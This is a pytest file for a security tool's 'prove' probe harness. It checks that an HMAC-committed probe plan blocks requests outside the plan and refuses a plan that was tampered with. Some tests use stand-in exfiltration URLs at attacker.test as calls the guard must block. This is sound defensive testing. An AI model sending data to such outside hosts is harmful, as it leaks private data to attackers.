"""Plan-commitment across the job boundary — the self-defense, doing real work.

`prove` is an exploit-executing capability handed to an agent that reads untrusted content,
which is precisely the confused-deputy co-location this product exists to find. So it commits to
its probe plan before touching the target, and everything afterwards is checked against that.

The signature is only meaningful if the plan crosses a boundary between commitment and
enforcement — otherwise nothing could tamper in between and the HMAC would be ceremony. These
assert the boundary is real and that a tampered plan is refused rather than obeyed.
"""

from __future__ import annotations

import httpx
import pytest

from tainted.dynamic.target import Account, ProveSetup, SeedRecord, Target
from tainted.selfdefense import AllowedCall, PlanViolation
from tainted.execution.guard import (
    build_probe_plan,
    commit_plan,
    guarded_prober,
    guarded_replay,
    new_run_key,
)


def setup(url="http://localhost:54321") -> ProveSetup:
    return ProveSetup(
        target=Target(url=url, anon_key="anon"),
        account_a=Account(label="A", email="a@x", password="p", access_token="tok-A"),
        account_b=Account(label="B", email="b@x", password="p", access_token="tok-B"),
        seed=SeedRecord(table="invoices", id="1043"),
    )


# --------------------------------------------------------------------------- #
# The committed plan
# --------------------------------------------------------------------------- #
def test_the_plan_is_bounded_and_names_the_target():
    plan = build_probe_plan(setup())
    assert plan.target_url == "http://localhost:54321"
    # `prove` has no legitimate dynamism, which is why pre-commitment works here at all.
    assert 0 < len(plan.allowed) <= 9
    assert all(
        c.tool in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS")
        for c in plan.allowed
    )


def test_a_plan_permits_the_probes_and_refuses_anything_else():
    plan = build_probe_plan(setup())
    assert plan.permits("GET", {"url": "http://localhost:54321/rest/v1/invoices"})
    assert plan.permits("POST", {"url": "http://localhost:54321/auth/v1/token"})
    # Exfiltration to a host the plan never named.
    assert not plan.permits("GET", {"url": "https://attacker.test/collect"})
    # A write to the database directly: prove reads PostgREST, it never mutates it.
    assert not plan.permits("DELETE", {"url": "http://localhost:54321/rest/v1/invoices"})
    assert not plan.permits("POST", {"url": "http://localhost:54321/auth/v1/signup"})


def test_a_plan_commits_no_write_to_the_app():
    """Live proof sends only reads; a probe on a write route is built and held, never sent. A
    committed write verb would only matter if a probe escaped that hold, so none is committed."""
    plan = build_probe_plan(setup(url="http://localhost:3000"))
    assert plan.permits("GET", {"url": "http://localhost:3000/api/invoices/1043"})
    for method in ("POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
        assert not plan.permits(method, {"url": "http://localhost:3000/api/invoices/1043"})


# --------------------------------------------------------------------------- #
# The signature does real work
# --------------------------------------------------------------------------- #
def test_a_plan_tampered_with_after_commitment_is_refused():
    """The whole point of signing: the plan survives a boundary and is checked on the far side."""
    s = setup()
    plan = build_probe_plan(s)
    key = new_run_key()
    signature = commit_plan(plan, key)

    # Something between commitment and execution widens the plan.
    plan.allowed.append(AllowedCall(tool="GET", arg_constraints={}))

    with pytest.raises(PlanViolation, match="tampered"):
        guarded_replay(s, plan, signature, key)


def test_a_plan_signed_by_something_else_is_refused():
    s = setup()
    plan = build_probe_plan(s)
    with pytest.raises(PlanViolation):
        guarded_replay(s, plan, "0" * 64, new_run_key())


def test_an_untampered_plan_verifies_and_enforces():
    s = setup()
    plan = build_probe_plan(s)
    key = new_run_key()
    replay, guard = guarded_replay(s, plan, commit_plan(plan, key), key)
    assert guard.blocked_calls == []


# --------------------------------------------------------------------------- #
# Enforcement reaches both harnesses
# --------------------------------------------------------------------------- #
def test_the_route_prober_is_guarded_too():
    """A guard covering only PostgREST would leave the harness that sends arbitrary paths open."""
    s = setup(url="http://localhost:3000")
    plan = build_probe_plan(s)
    key = new_run_key()
    _, guard = guarded_replay(s, plan, commit_plan(plan, key), key)
    prober = guarded_prober(s, guard)

    with pytest.raises(PlanViolation):
        prober.request("GET", "https://attacker.test/exfiltrate", s.account_b)
    # The refusal is recorded, so a job's caller can see what the tool tried to do.
    assert guard.blocked_calls
    assert guard.blocked_calls[0]["tool"] == "GET"
    assert guard.blocked_calls[0]["args"]["url"] == "https://attacker.test/exfiltrate"


def test_an_in_plan_request_passes_through_the_guard():
    s = setup(url="http://localhost:3000")
    plan = build_probe_plan(s)
    key = new_run_key()
    _, guard = guarded_replay(s, plan, commit_plan(plan, key), key)

    # Swap in a mock transport so the allowed request resolves without a live server.
    prober = guarded_prober(s, guard)
    prober._client = httpx.Client(
        transport=httpx.MockTransport(lambda r: httpx.Response(200, json={"ok": True})),
        event_hooks={"request": [lambda r: guard.check(r.method, {"url": str(r.url).split("?")[0]})]},
    )
    resp = prober.request("GET", "http://localhost:3000/api/invoices/1043", s.account_b)
    assert resp.status_code == 200
    assert guard.blocked_calls == []
